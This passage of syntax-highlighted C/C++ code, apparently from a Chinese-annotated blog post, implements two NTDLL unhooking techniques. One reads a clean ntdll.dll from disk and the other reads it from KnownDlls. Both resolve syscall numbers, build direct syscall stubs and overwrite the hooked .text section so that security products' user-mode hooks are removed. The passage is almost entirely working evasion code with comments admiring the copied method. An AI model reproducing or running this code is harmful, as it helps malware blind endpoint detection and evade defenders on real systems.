class="hljs-comment">//检测NTDLL</span><br>pLdeNTDLL = pLdeTmp;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (pLdeNTDLL == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Cannot find NTDLL.\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLdeNTDLL-&gt;DllBase + ((PIMAGE_DOS_HEADER)pLdeNTDLL-&gt;DllBase)-&gt;e_lfanew);<br>PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&amp;ImageNtHeaders-&gt;OptionalHeader + ImageNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);<br><br>ULONG_PTR DataSectionAddress = <span class="hljs-literal">NULL</span>;<br>DWORD DataSectionSize;<br><br><span class="hljs-keyword">for</span> (WORD i = <span class="hljs-number">0</span>; i &lt; ImageNtHeaders-&gt;FileHeader.NumberOfSections; i++) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span>*)SectionHeader[i].Name, <span class="hljs-string">&quot;.data&quot;</span>)) &#123;<br>DataSectionAddress = (ULONG_PTR)pLdeNTDLL-&gt;DllBase + SectionHeader[i].VirtualAddress;<br>DataSectionSize = SectionHeader[i].Misc.VirtualSize;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!DataSectionAddress || DataSectionSize &lt; <span class="hljs-number">16</span> * <span class="hljs-number">5</span>) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// NtOpenFile Syscall Number</span><br>DWORD dwNtOpenFile = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// NtCreateSection Syscall Number</span><br>DWORD dwNtCreateSection = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// NtOpenSection Syscall Number</span><br>DWORD dwNtOpenSection = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// NtMapViewOfSection Syscall Number</span><br>DWORD dwNtMapViewOfSection = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-keyword">for</span> (UINT uiOffset = <span class="hljs-number">0</span>; uiOffset &lt; DataSectionSize - (<span class="hljs-number">16</span> * <span class="hljs-number">5</span>); uiOffset++) &#123;<br><span class="hljs-keyword">if</span> (*(DWORD*)(DataSectionAddress + uiOffset) == <span class="hljs-number">0xb8d18b4c</span> &amp;&amp;<br>*(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">16</span>) == <span class="hljs-number">0xb8d18b4c</span> &amp;&amp;<br>*(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">32</span>) == <span class="hljs-number">0xb8d18b4c</span> &amp;&amp;<br>*(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">48</span>) == <span class="hljs-number">0xb8d18b4c</span> &amp;&amp;<br>*(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">64</span>) == <span class="hljs-number">0xb8d18b4c</span>) &#123;<br><br>dwNtOpenFile = *(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">4</span>); <span class="hljs-comment">// Needed for Technique - 1 (Reading NTDLL From Disk)</span><br><br>dwNtCreateSection = *(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">16</span> + <span class="hljs-number">4</span>); <span class="hljs-comment">// Needed for Technique - 1 (Reading NTDLL From Disk)</span><br><br>dwNtOpenSection = *(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">48</span> + <span class="hljs-number">4</span>); <span class="hljs-comment">// Needed for Technique - 2 (Reading NTDLL From KnownDlls)</span><br><br>dwNtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOffset + <span class="hljs-number">64</span> + <span class="hljs-number">4</span>); <span class="hljs-comment">// Needed for Both Technique - 1 and Technique - 2</span><br><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// A little check to see if we have successfully parsed syscall numbers</span><br><span class="hljs-comment">//判断解析调用数据是否成功</span><br><br><span class="hljs-keyword">if</span> (!dwNtMapViewOfSection) &#123;<br><br><span class="hljs-keyword">return</span> FALSE;<br><br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] NtOpenFile syscall number..............: %02x\n&quot;</span>, dwNtOpenFile);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] NtCreateSection syscall number.........: %02x\n&quot;</span>, dwNtCreateSection);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] NtOpenSection syscall number...........: %02x\n&quot;</span>, dwNtOpenSection);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] NtMapViewOfSection syscall number......: %02x\n\n&quot;</span>, dwNtMapViewOfSection);<br><br><span class="hljs-comment">// Create RX memory region for syscalls stub</span><br>ULONG_PTR pSyscallRegion = (ULONG_PTR)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">4</span> * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-keyword">if</span> (!pSyscallRegion) &#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Cannot allocate memory for syscals stubs.\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> FALSE;<br><br>&#125;<br><br><span class="hljs-comment">// Create NtOpenFile clean syscall memory region with stub</span><br><span class="hljs-comment">// 使用存根创建NtOpenFile清空系统调用内存区域</span><br>RxNtOpenFile = (RX_NtOpenFile)BuildSyscallStub(pSyscallRegion, dwNtOpenFile);<br><br><span class="hljs-comment">// Create NtCreateSection clean syscall memory region with stub</span><br>RxNtCreateSection = (RX_NtCreateSection)BuildSyscallStub(pSyscallRegion + MAX_SYSCALL_STUB_SIZE, dwNtCreateSection);<br><br><span class="hljs-comment">// Create NtOpenSection clean syscall memory region with stub</span><br>RxNtOpenSection = (RX_NtOpenSection)BuildSyscallStub(pSyscallRegion + (<span class="hljs-number">2</span> * MAX_SYSCALL_STUB_SIZE), dwNtOpenSection);<br><br><span class="hljs-comment">// Create NtMapViewOfSection clean syscall memory region with stub</span><br>RxNtMapViewOfSection = (RX_NtMapViewOfSection)BuildSyscallStub(pSyscallRegion + (<span class="hljs-number">3</span> * MAX_SYSCALL_STUB_SIZE), dwNtMapViewOfSection);<br><br><span class="hljs-comment">// Modify the syscall memory region to RX   将系统调用内存区域修改为RX</span><br>DWORD dwOldProtection;<br>BOOL bStatus = VirtualProtect((LPVOID)pSyscallRegion, <span class="hljs-number">4</span> * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &amp;dwOldProtection);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-comment">// Custom x64 GetProcAddress Implementation for NtProtectVirtualMemory executions from https://revers.engineering/custom-getprocaddress-and-getmodulehandle-implementation-x64/</span><br><span class="hljs-comment">// 执行NtProtectVirtualMemory的自定义x64 GetProcAddress实现 从 https://revers.engineering/custom-getprocaddress-and-getmodulehandle-implementation-x64/</span><br><span class="hljs-comment">// 完全复制过来的欸 所以能找出这个东西的这个技术也是特别的牛逼</span><br><span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">CustomGetProcAddress</span><span class="hljs-params">(<span class="hljs-type">void</span>* hModule, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* wAPIName)</span> &#123;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* lpBase = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)(hModule);<br><br>PIMAGE_DOS_HEADER idhDosHeader = (PIMAGE_DOS_HEADER)(lpBase);<br><br><span class="hljs-keyword">if</span> (idhDosHeader-&gt;e_magic == <span class="hljs-number">0x5A4D</span>) &#123;<br><br>PIMAGE_NT_HEADERS inhNtHeader = (PIMAGE_NT_HEADERS)(lpBase + idhDosHeader-&gt;e_lfanew);<br><br><span class="hljs-keyword">if</span> (inhNtHeader-&gt;Signature == <span class="hljs-number">0x4550</span>) &#123;<br><br>PIMAGE_EXPORT_DIRECTORY iedExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(lpBase + inhNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">register</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> uiIter = <span class="hljs-number">0</span>; uiIter &lt; iedExportDirectory-&gt;NumberOfNames; ++uiIter) &#123;<br><br><span class="hljs-type">char</span>* szNames = reinterpret_cast&lt;<span class="hljs-type">char</span>*&gt;(lpBase + reinterpret_cast&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*&gt;(lpBase + iedExportDirectory-&gt;AddressOfNames)[uiIter]);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(szNames, wAPIName) == <span class="hljs-number">0</span>) &#123;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> usOrdinal = reinterpret_cast&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>*&gt;(lpBase + iedExportDirectory-&gt;AddressOfNameOrdinals)[uiIter];<br><br><span class="hljs-keyword">return</span> (<span class="hljs-type">uintptr_t</span>)(lpBase + reinterpret_cast&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*&gt;(lpBase + iedExportDirectory-&gt;AddressOfFunctions)[usOrdinal]);<br><br>&#125;<br><br>&#125;<br><br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// Technique - 1</span><br><span class="hljs-comment">// Reads NTDLL From Disk and Clean</span><br><span class="hljs-comment">// 从磁盘中获取NTDLL</span><br>BOOL <span class="hljs-title function_">Technique1</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Using Technique-1, Reads NTDLL From Disk and Clean.\n\n&quot;</span>);<br><br>NTSTATUS ntStatus;<br><br><span class="hljs-comment">// Get handle to loaded/hooked NTDLL</span><br>HMODULE hHookedNtdll = GetModuleHandleA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br><span class="hljs-keyword">if</span> (hHookedNtdll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] GetModuleHandleA error: %d\n&quot;</span>, GetLastError());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>OBJECT_ATTRIBUTES ObjectAttributes = &#123; <span class="hljs-number">0</span> &#125;; <span class="hljs-comment">//ObjectAttributes 对象属性</span><br>UNICODE_STRING ObjectPath = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-comment">// 对象地址</span><br>IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-comment">// IO_STATUS_BLOCK是请求被处理的状态   IO流</span><br>_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hHookedNtdll, <span class="hljs-string">&quot;RtlInitUnicodeString&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlInitUnicodeString == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>RtlInitUnicodeString(&amp;ObjectPath, <span class="hljs-string">L&quot;\\??\\C:\\Windows\\System32\\ntdll.dll&quot;</span>);<br><br>InitializeObjectAttributes(&amp;ObjectAttributes, &amp;ObjectPath, OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//初始化对象属性</span><br><br>HANDLE hFile = <span class="hljs-literal">NULL</span>;<br><br>ntStatus = RxNtOpenFile(&amp;hFile, FILE_READ_DATA | GENERIC_READ, &amp;ObjectAttributes, &amp;IoStatusBlock, FILE_SHARE_READ, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtOpenFile error.\n&quot;</span>);<br>CloseHandle(hFile);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean NTDLL Handle Address.............: 0x%p\n&quot;</span>, hFile);<br><br>HANDLE hSection = <span class="hljs-literal">NULL</span>;<br><br>ntStatus = RxNtCreateSection(&amp;hSection, STANDARD_RIGHTS_REQUIRED | SECTION_MAP_READ | SECTION_QUERY, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PAGE_READONLY, SEC_IMAGE, hFile);<br><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtCreateSection error.\n&quot;</span>);<br>CloseHandle(hSection);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean Section Handle Address...........: 0x%p\n\n&quot;</span>, hSection);<br><br>LPVOID pCleanNtdll = <span class="hljs-literal">NULL</span>;<br>SIZE_T sztViewSize = <span class="hljs-number">0</span>;<br><br>ntStatus = RxNtMapViewOfSection(hSection, NtCurrentProcess(), &amp;pCleanNtdll, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;sztViewSize, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, PAGE_READONLY);<br><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtMapViewOfSection error.\n&quot;</span>);<br>CloseHandle(hSection);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean NTDLL Base Address...............: 0x%p\n&quot;</span>, pCleanNtdll);<br><br>MODULEINFO miHookedNtdll = &#123;&#125;;<br><br><span class="hljs-keyword">if</span> (GetModuleInformation(NtCurrentProcess(), hHookedNtdll, &amp;miHookedNtdll, <span class="hljs-keyword">sizeof</span>(miHookedNtdll)) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] GetModuleInformation error: %d\n&quot;</span>, GetLastError());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// Get base address of hooked NTDLL from MODULEINFO struct</span><br>LPVOID pHookedBaseAddress = (LPVOID)miHookedNtdll.lpBaseOfDll;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Hooked NTDLL Base Address..............: 0x%p\n\n&quot;</span>, pHookedBaseAddress);<br><br><span class="hljs-comment">// Get hooked NTDLL DOS header  DOS Header===DOS MZ头大小 + Dos sub(DOS代码块大小) </span><br>PIMAGE_DOS_HEADER pHookedDosHeader = (PIMAGE_DOS_HEADER)pHookedBaseAddress;<br><br><span class="hljs-comment">// Get hooked NTDLL NT header</span><br>PIMAGE_NT_HEADERS pHookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pHookedBaseAddress + pHookedDosHeader-&gt;e_lfanew);<br><br><span class="hljs-keyword">for</span> (SIZE_T i = <span class="hljs-number">0</span>; i &lt; pHookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;<br><br><span class="hljs-comment">// Get PE section header</span><br>PIMAGE_SECTION_HEADER pHookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pHookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));<br><br><span class="hljs-comment">// Get section name</span><br>LPSTR szHookedSectionName = (LPSTR)pHookedSectionHeader-&gt;Name;<br><br><span class="hljs-comment">// We found .TEXT section</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(szHookedSectionName, <span class="hljs-string">&quot;.text&quot;</span>)) &#123;<br><span class="hljs-comment">//strcmp函数是string compare(字符串比较)的缩写，用于比较两个字符串并根据比较结果返回整数</span><br><br><span class="hljs-comment">// Get start address of hooked .TEXT section</span><br>LPVOID pHookedTextSectionAddress = (LPVOID)((DWORD_PTR)pHookedBaseAddress + (DWORD_PTR)pHookedSectionHeader-&gt;VirtualAddress);<br><br><span class="hljs-comment">// Get start address of clean .TEXT section</span><br>LPVOID pCleanTextStartAddress = (LPVOID)((DWORD_PTR)pCleanNtdll + (DWORD_PTR)pHookedSectionHeader-&gt;VirtualAddress);<br><br><span class="hljs-comment">// Get size of .TEXT section</span><br>SIZE_T sztTextSectionSize = pHookedSectionHeader-&gt;Misc.VirtualSize;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Hooked NTDLL .TEXT Section VA..........: 0x%p\n&quot;</span>, pHookedTextSectionAddress);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean NTDLL .TEXT Section VA...........: 0x%p\n\n&quot;</span>, pCleanTextStartAddress);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Size of .TEXT Section..................: %zd\n&quot;</span>, sztTextSectionSize);<br><br><span class="hljs-comment">// Change original page protection of hooked NTDLL to RWX</span><br>LPVOID lpBaseAddress = pHookedTextSectionAddress;<br>SIZE_T uSize = sztTextSectionSize;<br><br>_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)CustomGetProcAddress(pCleanNtdll, <span class="hljs-string">&quot;NtProtectVirtualMemory&quot;</span>);<br><br>ULONG oldProtection;<br>ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &amp;lpBaseAddress, &amp;uSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);<br><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtProtectVirtualMemory - 1: Error.\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// Copy .TEXT section of clean NTDLL into hooked NTDLL .TEXT section</span><br><span class="hljs-comment">// 将清理的NTDLL的.TEXT部分复制到挂钩的NTDLL .TEXT部分</span><br><span class="hljs-built_in">memcpy</span>(pHookedTextSectionAddress, pCleanTextStartAddress, sztTextSectionSize);<br><br><span class="hljs-comment">// Revert back to original page protections of overwritten NTDLL .TEXT section</span><br><span class="hljs-comment">// 恢复到覆盖的NTDLL .TEXT部分的原始页保护</span><br>ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &amp;lpBaseAddress, &amp;uSize, oldProtection, &amp;oldProtection);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtProtectVirtualMemory - 2: Error.\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] NTDLL is cleaned. Closing handles...\n\n&quot;</span>);<br><br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">// Unmap the local section</span><br><span class="hljs-comment">// 取消本地区段的映射</span><br>_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hHookedNtdll, <span class="hljs-string">&quot;NtUnmapViewOfSection&quot;</span>);<br>ntStatus = NtUnmapViewOfSection(NtCurrentProcess(), pCleanNtdll);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtUnmapViewOfSection error: %X\n&quot;</span>, ntStatus);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// Close NTDLL section handle</span><br>CloseHandle(hSection);<br><br><span class="hljs-comment">// Close NTDLL disk handle</span><br>CloseHandle(hFile);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] All done.\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br><span class="hljs-comment">// Technique - 2</span><br><span class="hljs-comment">// Reads NTDLL From KnownDlls and Clean</span><br>BOOL <span class="hljs-title function_">Technique2</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Using Technique-2, Reads NTDLL From KnownDlls and Clean.\n\n&quot;</span>);<br><br>NTSTATUS ntStatus;<br><br><span class="hljs-comment">// Get handle to loaded/hooked NTDLL</span><br>HMODULE hHookedNtdll = GetModuleHandleA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br><span class="hljs-keyword">if</span> (hHookedNtdll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] GetModuleHandleA error: %d\n&quot;</span>, GetLastError());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>OBJECT_ATTRIBUTES ObjectAttributes = &#123; <span class="hljs-number">0</span> &#125;;<br>UNICODE_STRING ObjectPath = &#123; <span class="hljs-number">0</span> &#125;;<br>IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="hljs-number">0</span> &#125;;<br>_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hHookedNtdll, <span class="hljs-string">&quot;RtlInitUnicodeString&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlInitUnicodeString == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>RtlInitUnicodeString(&amp;ObjectPath, <span class="hljs-string">L&quot;\\KnownDlls\\ntdll.dll&quot;</span>);<br><br>InitializeObjectAttributes(&amp;ObjectAttributes, &amp;ObjectPath, OBJ_CASE_INSENSITIVE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>HANDLE hKnownDll = <span class="hljs-literal">NULL</span>;<br><br>ntStatus = RxNtOpenSection(&amp;hKnownDll, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &amp;ObjectAttributes);<br><span class="hljs-comment">// 前面都一样 到这里的opensection才不一样</span><br><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtOpenSection error.\n&quot;</span>);<br>CloseHandle(hKnownDll);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean Section Handle Address...........: 0x%p\n\n&quot;</span>, hKnownDll);<br><br>LPVOID pCleanNtdll = <span class="hljs-literal">NULL</span>;<br>SIZE_T sztViewSize = <span class="hljs-number">0</span>;<br><br>ntStatus = RxNtMapViewOfSection(hKnownDll, NtCurrentProcess(), &amp;pCleanNtdll, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;sztViewSize, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, PAGE_READONLY);<br><span class="hljs-comment">//一样的</span><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtMapViewOfSection error.\n&quot;</span>);<br>CloseHandle(hKnownDll);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean NTDLL Base Address...............: 0x%p\n&quot;</span>, pCleanNtdll);<br><br>MODULEINFO miHookedNtdll = &#123;&#125;;<br><br><span class="hljs-keyword">if</span> (GetModuleInformation(NtCurrentProcess(), hHookedNtdll, &amp;miHookedNtdll, <span class="hljs-keyword">sizeof</span>(miHookedNtdll)) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] GetModuleInformation error: %d\n&quot;</span>, GetLastError());<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// Get base address of hooked NTDLL from MODULEINFO struct</span><br>LPVOID pHookedBaseAddress = (LPVOID)miHookedNtdll.lpBaseOfDll;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Hooked NTDLL Base Address..............: 0x%p\n\n&quot;</span>, pHookedBaseAddress);<br><br><span class="hljs-comment">// Get hooked NTDLL DOS header</span><br>PIMAGE_DOS_HEADER pHookedDosHeader = (PIMAGE_DOS_HEADER)pHookedBaseAddress;<br><br><span class="hljs-comment">// Get hooked NTDLL NT header</span><br>PIMAGE_NT_HEADERS pHookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pHookedBaseAddress + pHookedDosHeader-&gt;e_lfanew);<br><br><span class="hljs-keyword">for</span> (SIZE_T i = <span class="hljs-number">0</span>; i &lt; pHookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;<br><br><span class="hljs-comment">// Get PE section header</span><br>PIMAGE_SECTION_HEADER pHookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pHookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));<br><br><span class="hljs-comment">// Get section name</span><br>LPSTR szHookedSectionName = (LPSTR)pHookedSectionHeader-&gt;Name;<br><br><span class="hljs-comment">// We found .TEXT section</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(szHookedSectionName, <span class="hljs-string">&quot;.text&quot;</span>)) &#123;<br><br><span class="hljs-comment">// Get start address of hooked .TEXT section</span><br>LPVOID pHookedTextSectionAddress = (LPVOID)((DWORD_PTR)pHookedBaseAddress + (DWORD_PTR)pHookedSectionHeader-&gt;VirtualAddress);<br><br><span class="hljs-comment">// Get start address of clean .TEXT section</span><br>LPVOID pCleanTextStartAddress = (LPVOID)((DWORD_PTR)pCleanNtdll + (DWORD_PTR)pHookedSectionHeader-&gt;VirtualAddress);<br><br><span class="hljs-comment">// Get size of .TEXT section</span><br>SIZE_T sztTextSectionSize = pHookedSectionHeader-&gt;Misc.VirtualSize;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Hooked NTDLL .TEXT Section VA..........: 0x%p\n&quot;</span>, pHookedTextSectionAddress);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Clean NTDLL .TEXT Section VA...........: 0x%p\n\n&quot;</span>, pCleanTextStartAddress);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Size of .TEXT Section..................: %zd\n&quot;</span>, sztTextSectionSize);<br><br><span class="hljs-comment">// Change original page protection of hooked NTDLL to RWX</span><br>LPVOID lpBaseAddress = pHookedTextSectionAddress;<br>SIZE_T uSize = sztTextSectionSize;<br><br>_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)CustomGetProcAddress(pCleanNtdll, <span class="hljs-string">&quot;NtProtectVirtualMemory&quot;</span>);<br><br>ULONG oldProtection;<br>ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &amp;lpBaseAddress, &amp;uSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);<br><br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtProtectVirtualMemory - 1: Error.\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// Copy .TEXT section of clean NTDLL into hooked NTDLL .TEXT section</span><br><span class="hljs-built_in">memcpy</span>(pHookedTextSectionAddress, pCleanTextStartAddress, sztTextSectionSize);<br><br><span class="hljs-comment">// Revert back to original page protections of overwritten NTDLL .TEXT section</span><br>ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &amp;lpBaseAddress, &amp;uSize, oldProtection, &amp;oldProtection);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtProtectVirtualMemory - 2: Error.\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[+] NTDLL is cleaned. Closing handles...\n\n&quot;</span>);<br><br><span class="hljs-keyword">break</span>;<br><br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">// Unmap the local section</span><br>_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddress(hHookedNtdll, <span class="hljs-string">&quot;NtUnmapViewOfSection&quot;</span>);<br>ntStatus = NtUnmapViewOfSection(NtCurrentProcess(), pCleanNtdll);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(ntStatus)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] NtUnmapViewOfSection error: %X\n&quot;</span>, ntStatus);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-comment">// Close KnownDll handle</span><br>CloseHandle(hKnownDll);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] All done.\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> 